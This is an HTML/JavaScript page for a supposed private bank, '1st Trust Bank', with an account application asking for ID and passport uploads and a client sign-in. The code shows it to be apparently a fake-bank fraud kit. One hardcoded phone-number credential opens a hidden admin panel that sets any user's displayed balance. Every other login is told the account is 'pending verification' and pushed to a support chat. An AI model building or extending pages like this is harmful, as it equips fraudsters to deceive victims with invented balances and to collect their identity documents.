DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
<meta charset="UTF-8">
<title>1st Trust Bank | Private Wealth Management</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script src="https://unpkg.com/@phosphor-icons/web"></script>
<style>
.hero-bg { background: linear-gradient(rgba(6, 78, 59, 0.9), rgba(6, 78, 59, 0.9)), url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=1920&q=80'); background-size: cover; background-position: center; }
.text-gold { color: #d4af37; }
.input-style { @apply w-full p-4 border border-slate-300 rounded-xl focus:ring-2 focus:ring-emerald-600 outline-none transition; }
</style>
</head>
<body class="bg-slate-50 text-slate-900">

<!-- Hero Section -->
<header class="hero-bg h-screen flex flex-col items-center justify-center text-white text-center p-6">
<i class="ph-fill ph-bank text-7xl text-gold mb-6"></i>
<h1 class="text-5xl md:text-7xl font-extrabold tracking-tighter mb-6">1st TRUST BANK</h1>
<p class="text-xl md:text-2xl font-light mb-10 max-w-2xl opacity-90">Exclusive financial services for the world's most discerning individuals.</p>
<div class="flex gap-4">
<a href="#apply" class="border-2 border-white px-8 py-4 font-bold hover:bg-white hover:text-emerald-900 transition uppercase tracking-widest">Open Account</a>
<a href="#login" class="bg-emerald-900 px-8 py-4 font-bold hover:bg-emerald-800 transition uppercase tracking-widest">Portal</a>
</div>
</header>

<main id="app" class="max-w-4xl mx-auto py-20 px-6 space-y-20">
<!-- Application Form -->
<section id="apply" class="bg-white p-10 rounded-3xl shadow-xl border border-slate-100">
<h2 class="text-3xl font-bold mb-8 text-emerald-900">Application for Private Access</h2>
<div class="grid md:grid-cols-2 gap-6">
<input type="text" id="full-name" placeholder="Full Legal Name" class="input-style">
<input type="email" id="email" placeholder="Email Address" class="input-style">
<input type="tel" id="phone" placeholder="Phone Number" class="input-style">
<input type="text" id="address" placeholder="Residential Address" class="input-style">
<select id="country" class="input-style"><option>Select Country</option></select>

<div class="md:col-span-2 border-2 border-dashed border-slate-300 p-6 rounded-xl text-center">
<p class="text-slate-500 mb-2">Upload Valid ID Card</p>
<input type="file" id="id-upload">
</div>
<div class="md:col-span-2 border-2 border-dashed border-slate-300 p-6 rounded-xl text-center">
<p class="text-slate-500 mb-2">Upload Passport Photograph</p>
<input type="file" id="passport-upload">
</div>
<button onclick="handleSignup()" class="md:col-span-2 bg-emerald-900 text-white font-bold py-4 rounded-xl hover:bg-emerald-800 transition">SUBMIT APPLICATION</button>
</div>
</section>

<!-- Login View -->
<section id="login" class="bg-white p-10 rounded-3xl shadow-xl border border-slate-100">
<h2 class="text-3xl font-bold mb-8 text-emerald-900">Client Sign In</h2>
<input type="text" id="user-id" placeholder="Account ID" class="input-style mb-4">
<input type="password" id="pass-id" placeholder="Password" class="input-style mb-6">
<button onclick="handleLogin()" class="w-full bg-emerald-900 text-white p-4 rounded-xl font-bold hover:bg-emerald-800 transition">SECURE LOGIN</button>
</section>
</main>

<!-- Admin Panel -->
<div id="admin-panel" class="hidden fixed inset-0 bg-white z-50 p-10">
<h2 class="text-4xl font-bold mb-10">Admin Dashboard</h2>
<input type="text" id="target-id" placeholder="User ID" class="input-style mb-4">
<input type="number" id="balance-val" placeholder="New Balance" class="input-style mb-4">
<button onclick="updateBalance()" class="bg-emerald-600 text-white px-8 py-4 rounded-xl">UPDATE BALANCE</button>
</div>

<!-- Chat Bubble -->
<button id="chat-btn" onclick="toggleChat()" class="hidden fixed bottom-6 right-6 bg-emerald-900 text-white p-4 rounded-full shadow-2xl">
<i class="ph-fill ph-chat-teardrop-dots text-3xl"></i>
</button>

<script>
const supabase = supabase.createClient('YOUR_URL', 'YOUR_KEY');
const ADMIN = "08059422423";

async function handleLogin() {
const u = document.getElementById('user-id').value;
const p = document.getElementById('pass-id').value;
if (u === ADMIN && p === ADMIN) {
document.getElementById('admin-panel').classList.remove('hidden');
} else {
alert("Account pending verification. Contact support.");
document.getElementById('chat-btn').classList.remove('hidden');
}
}

async function toggleChat() {
const msg = prompt("Contact Support:");
if(msg) await supabase.from('messages').insert([{message: msg}]);
}

async function handleSignup() {
alert("Application submitted. We will contact you shortly regarding verification.");
}

async function updateBalance() {
const userId = document.getElementById('target-id').value;
const amount = document.getElementById('balance-val').value;
const { error } = await supabase.from('users').update({ balance: amount }).eq('id', userId);
if (!error) alert("Balance updated.");
}
</script>
</body>
</html>
